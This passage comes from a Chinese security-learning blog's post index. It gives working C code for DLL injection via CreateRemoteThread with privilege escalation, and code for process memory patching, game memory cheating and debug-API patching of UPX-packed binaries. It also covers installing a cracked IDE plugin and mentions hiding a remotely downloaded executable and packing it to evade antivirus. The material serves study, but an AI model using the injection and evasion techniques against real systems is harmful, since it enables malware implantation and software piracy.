文件的内容\n进程访问令牌：令牌包含了用户账户的相关特权信息，当用户登录到一个windows计算机后，登陆进程验证用户的登陆凭据，登陆成功后会返回一个对应用户的各种信息的令牌，此后，当用户执行一个进程和线程的时候，这份令牌的拷贝会跟随每个进程、线程。\n用如下代码生成 naizidll.dll 文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;Windows.h\u0026gt; BOOL APIENTRY DllMain(HMODULE hmodule, DWORD reason, void *p) { switch (reason) { case DLL_PROCESS_ATTACH:\tMessageBoxA(0, \u0026#34;注入成功\u0026#34;, \u0026#34;注入成功\u0026#34;, 0);\t//dll被注入到程序后，自动执行 break; } return TRUE; } 再用如下代码生成目标文件 bazi.exe\n1 2 3 4 5 6 7 #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; void main() { printf(\u0026#34;靶子程序已经启动了。。。。\u0026#34;); system(\u0026#34;pause\u0026#34;); } 然后如下代码即可把 naizidll.dll 注入到正在运行的 bazi.exe 中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;TlHelp32.h\u0026gt; //进行注入之前首先要进行提权 int 进程提权() { int flag = 0; HANDLE 进程访问令牌; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, \u0026amp;进程访问令牌)) { TOKEN_PRIVILEGES 令牌权限; 令牌权限.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, \u0026amp;令牌权限.Privileges[0].Luid);\t//遍历权限 令牌权限.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\t//开启特权 if (AdjustTokenPrivileges(进程访问令牌, FALSE, \u0026amp;令牌权限, sizeof(令牌权限), NULL, NULL)) { flag = 1; } } CloseHandle(进程访问令牌); return flag; } //遍历进程 int _findProcess(char* name) { HANDLE 快照 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe32; pe32.dwSize = sizeof(PROCESSENTRY32); Process32First(快照, \u0026amp;pe32); while (Process32Next(快照,\u0026amp;pe32)) { if (_strcmpi(pe32.szExeFile,name)==0) { return pe32.th32ProcessID; } } } //注入 void dllinject(char* exename,char* dllname) { //开始注入前，先进行提权 if (进程提权() == 1) { HANDLE 目标进程id = _findProcess(exename); if (目标进程id !=0 ) { HANDLE 目标进程句柄 = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 目标进程id); if (目标进程句柄 != NULL) { //开始注入 //首先 在目标进程申请一块内存 int dllLength = strlen(dllname) + 1;\t//获取dll文件的长度，+1是尾部的/0 void* dll文件名地址 = VirtualAllocEx(目标进程句柄, NULL, dllLength, MEM_COMMIT, PAGE_READWRITE);\t//读写权限，这片内存主要用于放dll文件名，不需要执行权限 if (dll文件名地址 == NULL) { printf(\u0026#34;分配内存失败\u0026#34;); } else { //把dll名写入进去 WriteProcessMemory(目标进程句柄, dll文件名地址, dllname, dllLength, 0); //创建远程线程 HMODULE hmode = GetModuleHandleA(\u0026#34;kernel32.dll\u0026#34;);\t//目标地址空间的library存在于kernel32.dll中 LPTHREAD_START_ROUTINE 函数地址 = GetProcAddress(hmode, \u0026#34;LoadLibraryA\u0026#34;);\tHANDLE hthread = CreateRemoteThread(目标进程句柄, NULL, 0, 函数地址, dll文件名地址, 0, 0);\t//创建远程线程 if (hthread == NULL) { printf(\u0026#34;远程线程创建失败\u0026#34;); } } } else { GetLastError(); printf(\u0026#34;进程打开失败\u0026#34;); } } } else { GetLastError(); printf(\u0026#34;进程提权失败\u0026#34;); } } void main() { char* exename = \u0026#34;bazi.exe\u0026#34;; char* dllname = \u0026#34;naizidll.dll\u0026#34;; dllinject(exename, dllname); system(\u0026#34;pause\u0026#34;); } 执行结果如下：\n注意：上面的代码是注入到 32 位程序，并且对于 QQ 等存在保护的程序是无法注入的\n在注入 dll 注入到程序后，会自动执行，但是有的 dll 注入工具会让我们选择注入后加载执行的函数，如下：\n上面的功能如何实现呢 ？\n比如：我们想要加载如下 DLLproject.dll 的时候执行 MessageBoxA(0, \u0026quot;fn注入成功\u0026quot;, \u0026quot;fn注入成功\u0026quot;, 0);\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;Windows.h\u0026gt; _declspec(dllexport) void fn() { MessageBoxA(0, \u0026#34;fn注入成功\u0026#34;, \u0026#34;fn注入成功\u0026#34;, 0); } BOOL APIENTRY DllMain(HMODULE hmodule, DWORD reason, void* p) { switch (reason) { case DLL_PROCESS_ATTACH: MessageBoxA(0, \u0026#34;注入成功\u0026#34;, \u0026#34;注入成功\u0026#34;, 0);\t//dll被注入到程序后，自动执行 break; } return TRUE; } 执行如下代码，第一次弹出注入成功，第二次弹出注入成功，第三次弹出fn注入成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;TlHelp32.h\u0026gt; //进行注入之前首先要进行提权 int 进程提权() { int flag = 0; HANDLE 进程访问令牌; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, \u0026amp;进程访问令牌)) { TOKEN_PRIVILEGES 令牌权限; 令牌权限.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, \u0026amp;令牌权限.Privileges[0].Luid);\t//遍历权限 令牌权限.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\t//开启特权 if (AdjustTokenPrivileges(进程访问令牌, FALSE, \u0026amp;令牌权限, sizeof(令牌权限), NULL, NULL)) { flag = 1; } } CloseHandle(进程访问令牌); return flag; } //遍历进程 int _findProcess(char* name) { HANDLE 快照 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe32; pe32.dwSize = sizeof(PROCESSENTRY32); Process32First(快照, \u0026amp;pe32); while (Process32Next(快照,\u0026amp;pe32)) { if (_strcmpi(pe32.szExeFile,name)==0) { return pe32.th32ProcessID; } } } //注入 void dllinject(char* exename,char* dllname, char* fnnanme) { HMODULE dll模块首地址 = LoadLibraryA(dllname);\t//第一次弹出注入成功 void(*fn函数地址) = (void(*)())GetProcAddress(dll模块首地址, fnnanme);\t//获取 fnname函数地址 int 偏移量 = (char*)fn函数地址 - (char*)dll模块首地址; //开始注入前，先进行提权 if (进程提权() == 1) { HANDLE 目标进程id = _findProcess(exename); if (目标进程id !=0 ) { HANDLE 目标进程句柄 = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 目标进程id); if (目标进程句柄 != NULL) { //开始注入 //首先 在目标进程申请一块内存 int dllLength = strlen(dllname) + 1;\t//获取dll文件的长度，+1是尾部的/0 void* dll文件名地址 = VirtualAllocEx(目标进程句柄, NULL, dllLength, MEM_COMMIT, PAGE_READWRITE);\t//读写权限，这片内存主要用于放dll文件名，不需要执行权限 if (dll文件名地址 == NULL) { printf(\u0026#34;分配内存失败\u0026#34;); } else { //把dll名写入进去 WriteProcessMemory(目标进程句柄, dll文件名地址, dllname, dllLength, 0); //创建远程线程 HMODULE hmode = GetModuleHandleA(\u0026#34;kernel32.dll\u0026#34;);\t//目标地址空间的library存在于kernel32.dll中 LPTHREAD_START_ROUTINE 函数地址 = GetProcAddress(hmode, \u0026#34;LoadLibraryA\u0026#34;);\t//第二次弹出注入成功， HANDLE hthread = CreateRemoteThread(目标进程句柄, NULL, 0, 函数地址, dll文件名地址, 0, 0);\t//创建远程线程 if (hthread == NULL) { GetLastError(); printf(\u0026#34;远程线程创建失败\u0026#34;); } WaitForSingleObject(hthread,INFINITE); DWORD dll模块 = 0; GetExitCodeThread(hthread, \u0026amp;dll模块); void(*fn)() = (void(*)())(dll模块 + 偏移量); hthread = CreateRemoteThread(目标进程句柄, NULL, 0, (LPTHREAD_START_ROUTINE)fn, 0, 0, 0);\t//创建远程线程\t//第三次弹出 fn注入成功 if (hthread == NULL) {\tGetLastError(); printf(\u0026#34;远程线程创建失败\u0026#34;); } WaitForSingleObject(hthread, INFINITE); } } else { GetLastError(); printf(\u0026#34;进程打开失败\u0026#34;); } CloseHandle(目标进程句柄); } } else { GetLastError(); printf(\u0026#34;进程提权失败\u0026#34;); } } void main() { char* exename = \u0026#34;bazi.exe\u0026#34;; char* dllname = \u0026#34;DLLproject.dll\u0026#34;; dllinject(exename, dllname,\u0026#34;fn\u0026#34;); system(\u0026#34;pause\u0026#34;); } 上面的 DLL 注入都存在一些弊端，我们通过火绒剑等工具完全可以看到注入到进程里面的DLL模块：\n有两种办法解决上面问题：\n以汇编的形式注入 傀儡进程 ","description":"","id":9,"section":"posts","tags":["DLL注入"],"title":"32位DLL注入","uri":"https://0xo7.github.io/zh/posts/2023-1223-02/"},{"content":" 由于 vs2022 配置 win32 汇编环境始终出现问题，所有 vs2022 里面能够安装的 msvc 版本均高于 14.26.28801，所以采用 vs2019 配置相关的环境\n但是 vs2019 的代码补全好像存在一定问题，部分情况下并不会自动补全。如下是安装了 Visual Assist x 插件的情况，如果没有安装，u.Exception.后面根本不会出现相关的补全代码，这样我们写代码就非常麻烦\n在安装 VAX 插件时遇到了很多问题，大部分破解插件都无法使用，最终完全参考该文章配置成功，为了方便以后重新配置，所以重新记录下\n环境：win10 专业版、VS2019 32位社区版（官方原版）\n相关软件如下：\n其它注意事项：安装时尽量退出杀软，装完之后对 VA_X.DLL 添加信任 （这里我并没有退出杀软和添加信任，看情况操作，只要杀软没有干掉相关破解软件就无所谓）\n安装步骤：\n关闭 vs2019，双击执行 VA_X_Setup2406_0.exe 文件（如无法执行，右键—属性—兼容性—以兼容性运行这个程序(windows 7)），等待安装。此时\n用 everything 搜索 VaXSetup.vsix，在 Temp 文件夹找到该文件，然后复制到桌面\n注意：VA_X_Setup2406_0.exe 的安装最终会发生错误，提示安装失败（不要紧），VA_X_Setup2406_0.exe 安装完后，会在 C:\\Users\\用户\\AppData\\Local\\Microsoft\\VisualStudio\\16.0_46142712\\Extensions 下生成一些文件。删除这个目录下所有文件夹和文件。（并不一定是 16.0_46142712 文件夹下的 Extensions ）\n如果 VisualStudio 下有多个类似 16.0_46142712 样式的文件夹，我们直接选择今天的即可\n双击桌面上的 VaXSetup.vsix 进行重新安装，此时会安装成功。同时会在 C:\\Users\\用户\\AppData\\Local\\Microsoft\\VisualStudio\\16.0_46142712\\Extensions 目录下生成新的文件夹和文件，如下：\n（其实对于 VS2019， VAX 是安装 Extensions 目录下的，所以如果 VAX 插件出现问题，则可以多次删除，多次重装。2010 及之前版本则不同。）\n把破解的 VA_X.dll 和 PiaoYun.dll 拷贝到 Extensions/w0ufgxid.152/ 里面，用来覆盖\n然后找到 vs2019 的安装目录，如下：\ncmd 下切换到该目录，执行 devenv.exe /safemode 命令来打开 vs2019 （安全模式下运行）\n此时在 VS2019 的扩展—管理扩展—已安装下已经有 Visual Assist x 插件，但不能使用（是灰色的），关闭 VS2019\n再正常打开 vs2019，最终会看到 extension 菜单下出现 Visual Assist x\n这还没完。需要去掉插件更新和 Visual Assist x 更新勾选，如下：\n","description":"vs2019 环境下安装 Visual Assist x 插件方法","id":10,"section":"posts","tags":["vs2019"],"title":"VS2019 安装 VAX 插件","uri":"https://0xo7.github.io/zh/posts/2023-1223-01/"},{"content":"\nTitle Description 小球飞鱼 我们会一起遇见鲸鱼吗？ ","description":"","id":11,"section":"","tags":null,"title":"全部友链","uri":"https://0xo7.github.io/zh/friendslink/"},{"content":"\t友链页面 全部 开始拜访 你敲了敲： 的门，全部友链 ","description":"","id":12,"section":"","tags":null,"title":"冲浪时间","uri":"https://0xo7.github.io/zh/friends/"},{"content":"基础知识补充：\n查看环境变量，也可以cmd下输入set来查看\n查看环境变量，也可以用win32api查看，如下\n远程下载exe，然后执行\nSW_HIDE 是隐藏窗口，而测试的时候，可以用 SH_SHOW 显示窗口，正常会报毒，加壳可以避免一定程度报毒\n除了用 WinExec 外创建进程，还可以用 CreateProcess 创建进程\n1 2 3 4 5 6 7 8 9 10 11 12 13 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; void main() { STARTUPINFO info; GetStartupInfo(\u0026amp;info); PROCESS_INFORMATION pinfo; CreateProcess(NULL, \u0026#34;c:/fuff.exe\u0026#34;, NULL, NULL, NULL,NULL,NULL,NULL,\u0026amp;info,\u0026amp;pinfo); } 使用 CreateProcess 时可以设置为挂起状态，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; void main() { STARTUPINFO info; GetStartupInfo(\u0026amp;info); PROCESS_INFORMATION pinfo; CreateProcess(NULL, \u0026#34;c:/fuff.exe\u0026#34;, NULL, NULL, NULL,CREATE_SUSPENDED,NULL,NULL,\u0026amp;info,\u0026amp;pinfo); ResumeThread(pinfo.hThread); } 还可以设置DEBUG_PROCESS，这样进程就可以被调试，这样设置后，当前创建进程的子进程也可以被调试，如果设置为 DEBUG_ONLY_THIS_PROCESS 则仅调试当前创建的进程，一般同时指定这两个参数就行，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; void main() { STARTUPINFO info; GetStartupInfo(\u0026amp;info); PROCESS_INFORMATION pinfo; CreateProcess(NULL, \u0026#34;c:/fuff.exe\u0026#34;, NULL, NULL, NULL, DEBUG_PROCESS | DEBUG_ONLY_THIS_PROCESS,NULL,NULL,\u0026amp;info,\u0026amp;pinfo); ResumeThread(pinfo.hThread); } 进程读写，修改游戏内存，以植物大战僵尸为案例\n由于在尝试的时候 findwindow 没有找到窗口（很奇怪），所以直接用spy查找到实际句柄\n然后ce查找内存地址\n最后可以通过 ReadProcessMemory 读取内存地址的值，可以打印出 150 个太阳\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; void main() { // HANDLE 窗口句柄 = FindWindow(NULL, \u0026#34;植物大战僵尸中文版\u0026#34;); HWND 窗口句柄 = (HWND)0x002303BC; DWORD p = 0; GetWindowThreadProcessId(窗口句柄, \u0026amp;p); HANDLE hd = OpenProcess(PROCESS_ALL_ACCESS, TRUE, p); int* lp = 0x15F73908; int* num = malloc(4); ReadProcessMemory(hd,lp,num,4,NULL); printf(\u0026#34;%d\u0026#34;, *num); } 修改太阳为 10000\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; void main() { // HANDLE 窗口句柄 = FindWindow(NULL, \u0026#34;植物大战僵尸中文版\u0026#34;); HWND 窗口句柄 = (HWND)0x002303BC; DWORD p = 0; GetWindowThreadProcessId(窗口句柄, \u0026amp;p); HANDLE hd = OpenProcess(PROCESS_ALL_ACCESS, TRUE, p); int* lp = 0x15F73908; int* num = malloc(4); ReadProcessMemory(hd, lp, num, 4, NULL); *num = 10000; WriteProcessMemory(hd, lp, num, 4, NULL); printf(\u0026#34;%d\u0026#34;, *num); } 利用 CreateToolhelp32Snapshot 遍历 tasklist 所有进程，CreateToolhelp32Snapshot 相当于把 tasklit 显示出的当前进程截图，然后返回，但CreateToolhelp32Snapshot 返回的进程不是实时的\nCreateToolhelp32Snapshot 可以遍历所有进程，也可以遍历一个进程里面的所有模块或者堆\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;TlHelp32.h\u0026gt; void main() { HANDLE hd = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(pe); Process32First(hd, \u0026amp;pe); while (Process32Next(hd, \u0026amp;pe)) { wprintf(L\u0026#34;%s\t%d\\n\u0026#34;, pe.szExeFile, pe.th32ProcessID); } } 关闭计算器进程\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;TlHelp32.h\u0026gt; int main() { char* name = \u0026#34;CalculatorApp.exe\u0026#34;; HANDLE hd = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(pe); Process32First(hd, \u0026amp;pe); while (Process32Next(hd, \u0026amp;pe)) { HANDLE 进程 = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pe.th32ProcessID); if (进程 != NULL) { if (strcmp(name, pe.szExeFile) == 0) { if (TerminateProcess(进程, 0)) { printf(\u0026#34;Terminated process: %s\\n\u0026#34;, pe.szExeFile); } else { DWORD error = GetLastError(); printf(\u0026#34;Failed to terminate process: %lu\\n\u0026#34;, error); } } CloseHandle(进程); } else { DWORD error = GetLastError(); wprintf(L\u0026#34;Failed to open process: %lu, %s\\n\u0026#34;, error, pe.szExeFile); } } CloseHandle(hd); return 0; } 这里关闭失败了，结果如下，5 表示权限不够，可能要提权才能够关闭（不是很清楚）\n打印计算器进程的模块\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;TlHelp32.h\u0026gt; void main() { char name[30] = \u0026#34;CalculatorApp.exe\u0026#34;; HANDLE hd = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, NULL); MODULEENTRY32 module; module.dwSize = sizeof(module); Module32First(hd, \u0026amp;module); while (Module32Next(hd, \u0026amp;module)) { wprintf(L\u0026#34;%s\\n\u0026#34;, module.szExePath); } } 编译如下汇编代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 .386 .model flat, stdcall option casemap:none include D:\\masm32\\include\\user32.inc include D:\\masm32\\include\\windows.inc include D:\\masm32\\include\\kernel32.inc .data Err db \u0026#39;乃子哥哥爱吃槟榔\u0026#39;,0 Ok db \u0026#39;乃子哥哥爱看黄色\u0026#39;,0 caption db \u0026#39;乃子哥哥yyds\u0026#39;,0 .code fn proc xor eax,eax .if eax invoke MessageBoxA, NULL, addr Ok, addr caption, MB_OK .elseif invoke MessageBoxA, NULL, addr Err, addr caption, MB_ICONSTOP .endif ret fn endp start: invoke fn invoke ExitProcess, 0 end start 然后用ollylce调试\n注意：\n多次重复用ollylce加载发现je跳转的地址始终不发现变化，pe的exe文件反汇编后开始的地址短时间内不会发生改变。\n但对于dll文件，dll在物理内存中只有一份，dll文件是通过分页机制映射到虚拟内存中的，虚拟地址空间是隔离的，但是如果虚拟内存空间被占用了，那么就需要重定位，所以dll文件反汇编的开始地址并不一定是相同的，可能发生变化，这样我们就需要遍历整个模块的空间来找到起始地址\n但是由于这里是 exe 文件，所以短时间内程序入口地址不会变化，即 0x0059206B 不会变化，所以0x00592040肯定也不会变化，那么如果我们能够读取 0x00592040的地址对应的值1574（小端存储，7415也就是1574），并且修改成 9090 （也就是nop），那么就能够模仿上面在ce 中调试修改的操作，也就相当于补丁\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; void main() { STARTUPINFO info; GetStartupInfo(\u0026amp;info); PROCESS_INFORMATION pinfo; if (CreateProcess(_T(\u0026#34;C:\\\\MASM.exe\u0026#34;), NULL, NULL, NULL, NULL, NULL, NULL, NULL, \u0026amp;info, \u0026amp;pinfo)) { printf(\u0026#34;进程创建成功\\n\u0026#34;); } else { DWORD error = GetLastError(); printf(\u0026#34;进程创建失败，错误码: %d\\n\u0026#34;, error); } void* p = 0x00592040; short oldbyte = 0x1574; short* newbyte = malloc(2); HANDLE hd = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pinfo.dwProcessId); ReadProcessMemory(hd, p, newbyte, 2, NULL); if (oldbyte != *newbyte) { printf(\u0026#34;程序版本不对，无法添加补丁\u0026#34;); } else { *newbyte = 0x9090; WriteProcessMemory(hd, p, newbyte, 2, NULL); } } 执行结果如下：\n对 exe 进行upx加壳后，再用OllyICE进行F8单步调试，则发现一直在来回跳，无法继续往下执行（加壳就是防止反调试）\n以前的壳分为两种：\n一种是专门用于把代码压缩，降低可执行文件体积，比如压缩后是 123.exe，那么 123.exe 中当然还有一个解压缩代码 第二种就是对代码进行加密 现在的壳一般同时具备压缩和加密两种特性\n如何对加壳的程序进行打补丁 ？？\n把加壳后的程序拖入调试器，显示如下：\n解压缩代码的最后有一个跳转\n执行完解压缩代码后，进行跳转，再执行原本的程序\n如果直接跳过运行这段解压缩代码，直接从最后 jmp 开始执行\n最后结果如下，发现无法跳转到原来的程序中，所以解压缩代码无法跳过\n但是如果我们运行完解压缩代码后，再执行 jmp 跳转，那么就可以跳转到原来的程序中\n可以模拟上面的思路，编写代码模拟上面调试器的过程，当解压缩代码执行完，然后跳转到原来的程序中后，再进行打补丁\n具体代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; unsigned char int3 = 0xcc; char* 要下断点的地址 = 0x009EADAA; unsigned char 原来的机器码 = 0; void* 补丁地址 = 0x009E2040; unsigned short 补丁 = 0x9090; void main(int arc,char* arv[],char* env[]) { STARTUPINFO info; GetStartupInfo(\u0026amp;info); PROCESS_INFORMATION pinfo; CreateProcess(_T(\u0026#34;C:\\\\upx_test.exe\u0026#34;), NULL, NULL, NULL, NULL, DEBUG_PROCESS | DEBUG_ONLY_THIS_PROCESS, NULL, NULL, \u0026amp;info, \u0026amp;pinfo); CONTEXT 线程的上下文; DEBUG_EVENT event; while (1) { WaitForDebugEvent(\u0026amp;event, INFINITE);\t//win32调试api if (event.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) {\t//判断被调试进程是否退出 break; } if (event.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {\t//进程被创建 ReadProcessMemory(pinfo.hProcess, 要下断点的地址, \u0026amp;原来的机器码, 1, NULL);\t//用于保存原来的机器码 WriteProcessMemory(pinfo.hProcess, 要下断点的地址, \u0026amp;int3, 1, NULL);\t//下断点 } //EXCEPTION_DEBUG_EVENT：当被调试进程发生异常事件，被调试进程开始执行第一个条指令前本事件发生一次，之后只有在单步中断和断点中断才会发生这个事件 else if (event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) { if (event.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT) //如果是断点中断 { 线程的上下文.ContextFlags = CONTEXT_FULL; GetThreadContext(pinfo.hThread, \u0026amp;线程的上下文); if (线程的上下文.Eip == 要下断点的地址+1) { WriteProcessMemory(pinfo.hProcess, 要下断点的地址, \u0026amp;原来的机器码, 1, NULL); 线程的上下文.Eip--; SetThreadContext(pinfo.hThread, \u0026amp;线程的上下文); WriteProcessMemory(pinfo.hProcess,补丁地址, \u0026amp;补丁, 2, NULL); } } } //当被调试的进程发生与调试事件有关时，windows 就会将目标进程的线程挂起并给调试器发送一个事件通知，调试器使用 WaitForDebugEvent 函数获取这些事件，在处理完这些事件后，要用 ContinueDebugEvent 来恢复。 ContinueDebugEvent(event.dwProcessId, event.dwThreadId, DBG_CONTINUE); } CloseHandle(pinfo.hProcess); CloseHandle(pinfo.hThread); } 上面的代码是断点中断，但是当代码进入断点中断后，还可以再进行单步调试（中断）\neflags 的 tf 位等于1的时候，CPU 处于单步执行指令的方式\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; unsigned char int3 = 0xcc; char* 要下断点的地址 = 0x009EADAA; unsigned char 原来的机器码 = 0; void* 补丁地址 = 0x009E2040; unsigned short 补丁 = 0x9090; void main(int arc,char* arv[],char* env[]) { STARTUPINFO info; GetStartupInfo(\u0026amp;info); PROCESS_INFORMATION pinfo; CreateProcess(_T(\u0026#34;C:\\\\upx_test.exe\u0026#34;), NULL, NULL, NULL, NULL, DEBUG_PROCESS, NULL, NULL, \u0026amp;info, \u0026amp;pinfo); CONTEXT 线程的上下文; DEBUG_EVENT event; while (1) { WaitForDebugEvent(\u0026amp;event, INFINITE);\t//win32调试api if (event.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) {\t//判断被调试进程是否退出 break; } if (event.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {\t//进程被创建 ReadProcessMemory(pinfo.hProcess, 要下断点的地址, \u0026amp;原来的机器码, 1, NULL);\t//用于保存原来的机器码 WriteProcessMemory(pinfo.hProcess, 要下断点的地址, \u0026amp;int3, 1, NULL);\t//下断点 } //EXCEPTION_DEBUG_EVENT：当被调试进程发生异常事件，被调试进程开始执行第一个条指令前本事件发生一次，之后只有在单步中断和断点中断才会发生这个事件 else if (event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) { if (event.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT) //如果是断点中断 { 线程的上下文.ContextFlags = CONTEXT_FULL; GetThreadContext(pinfo.hThread, \u0026amp;线程的上下文); if (线程的上下文.Eip == 要下断点的地址+1) { WriteProcessMemory(pinfo.hProcess, 要下断点的地址, \u0026amp;原来的机器码, 1, NULL); 线程的上下文.Eip--; 线程的上下文.EFlags |= 0x100; //设置单步调试 SetThreadContext(pinfo.hThread, \u0026amp;线程的上下文); } } else if (event.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP)\t//如果是单步中断 { // 如果是单步调试 线程的上下文.ContextFlags = CONTEXT_FULL; GetThreadContext(pinfo.hThread, \u0026amp;线程的上下文); char ch = 0; putchar(\u0026#39;-\u0026#39;); scanf(\u0026#34;%c\u0026#34;, \u0026amp;ch); getchar(); printf(\u0026#34;寄存器eip:%08x eflags:%08x\tesp:%08x\\n\u0026#34;,线程的上下文.Eip,线程的上下文.EFlags,线程的上下文.Esp); 线程的上下文.EFlags |= 0x100; //设置单步调试 SetThreadContext(pinfo.hThread, \u0026amp;线程的上下文); } } //当被调试的进程发生与调试事件有关时，windows 就会将目标进程的线程挂起并给调试器发送一个事件通知，调试器使用 WaitForDebugEvent 函数获取这些事件，在处理完这些事件后，要用 ContinueDebugEvent 来恢复。 ContinueDebugEvent(event.dwProcessId, event.dwThreadId, DBG_CONTINUE); } CloseHandle(pinfo.hProcess); CloseHandle(pinfo.hThread); } 上面代码执行后，输入 t 即可单步调试获取相关寄存器的值\n","description":"","id":13,"section":"posts","tags":["补丁","进程遍历","win32api调试"],"title":"进程遍历 | 内存补丁 | win32 api调试","uri":"https://0xo7.github.io/zh/posts/2023-1120-02/"},{"content":" 稿定设计官网\n然后不要 关闭控制台，刷新即可\n但这样比较麻烦，可以利用插件 uBlock Origin 添加过滤规则，如下：\n这样每次打开稿定设计都是无水印，之后自行截图即可\n","description":"搞定设计网页版去水印方法","id":14,"section":"posts","tags":["windows_api"],"title":"稿定设计去水印","uri":"https://0xo7.github.io/zh/posts/2023-1005-01/"},{"content":" 啥也不会，md，菜就多练 ！！\n2024-01-13 bibi哔哔\n2023-12-15 图片测试：\n2023-12-15 ","description":"","id":16,"section":"bibi","tags":null,"title":"哔哔","uri":"https://0xo7.github.io/zh/bibi/bibi_page/"}]